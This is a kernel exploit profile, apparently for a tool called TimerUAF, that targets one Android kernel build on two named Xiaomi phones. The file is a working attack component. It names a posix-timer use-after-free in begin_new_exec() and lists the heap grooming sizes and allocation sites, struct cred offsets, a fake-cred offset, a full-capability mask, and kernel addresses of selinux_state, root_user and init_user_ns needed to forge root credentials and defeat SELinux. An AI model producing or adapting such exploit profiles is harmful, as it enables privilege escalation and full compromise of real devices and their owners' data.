# TimerUAF kernel profile (HOCON; JSON remains valid)
# Device: Xiaomi 18 Pro (hongkong) and Xiaomi 18 Pro Max (madrid)
# Kernel: 6.18.21-android17-5-g284297031c53-abogki555938958-4k (4K pages)
#
# Both devices carry a byte-identical kernel payload, so one profile covers
# them.  Every constant below is derived from that factory boot.img:
#   posixtimer_init    kmem_cache_create("posix_timers_cache", 0x180, 0x40,
#                      SLAB_HWCACHE_ALIGN|...) -> timer_alloc 0x180
#   do_timer_create    bl kmem_cache_alloc_noprof at 0xffffffc080211130,
#                      returns to 0xffffffc080211134 (x0 = posix_timers_cache)
#   copy_process       calls dup_task_struct, whose
#                      bl kmem_cache_alloc_node_noprof at 0xffffffc0800f4c0c
#                      returns to 0xffffffc0800f4c10 (x0 = task_struct_cachep)
#                      -> low21 0xf4c10
#   arch_task_struct_size = sizeof(task_struct) 0x1280 + 0x400 from the
#                      android_arch_task_struct_size=1024 vendor cmdline
#
# Vulnerability: fs/exec.c begin_new_exec() still calls
# posix_cpu_timers_exit() before exit_itimers().
release = "6.18.21-android17-5-g284297031c53-abogki555938958-4k"
schema_version = 1
ksu_kmi = "android17-6.18"

page_size = 4096
page_shift = 12
slab_order = 1
slab_size = 8192
linear_min = 0xffffff0000000000
linear_max = 0xffffffc000000000

# do_timer_create -> kmem_cache_alloc_noprof(posix_timers_cache)
timer_site = 0xffffffc080211134
timer_alloc = 0x180
# k_itimer.it (cpu_timer) sits at +0xe0; struct cpu_timer.node is at +0
timer_node_off = 0xe0

# cred_jar: sizeof(struct cred)=0xb8 (BTF), SLAB_HWCACHE_ALIGN -> 0xc0
cred_req = 0xb8
cred_alloc = 0xc0
cred_size = 0xb8
cred_uid_off = 0x8
cred_euid_off = 0x18
cred_cap_off = 0x30
cred_cap_count = 5
cred_security_off = 0x80
cred_user_off = 0x88
cred_userns_off = 0x90
cred_ucounts_off = 0x98
cred_group_off = 0xa0
fake_cred_off = 0x18

# link-time symbols (kallsyms)
selinux_state = 0xffffffc082918630
panic_on_warn = 0xffffffc08266bf10

# task_struct / cred layout (BTF)
task_cred_off = 0x908
copy_process_low21 = 0xf4c10
# 0x1280 (BTF sizeof task_struct) + 0x400 (bootconfig vendor extension)
task_alloc_bytes = 0x1680

# capability and fake-cred refcounted sub-objects
fullcap = 0x1ffffffffff
root_user = 0xffffffc082691388
init_user_ns = 0xffffffc0826910d8
init_ucounts = 0xffffffc082692f08
init_groups = 0xffffffc082692a48

# task_security_struct
# Runtime CONFIG_LSM order is
#   landlock,lockdown,yama,loadpin,safesetid,selinux,smack,tomoyo,apparmor,ipe,bpf
# lsm_set_blob_sizes() assigns cred-blob offsets in that registration order,
# and landlock (lbs_cred = 11) registers first, so selinux is ALIGN(11, 8) = 0x10.
selinux_blob_off = 0x10
selinux_sid_kernel = 1
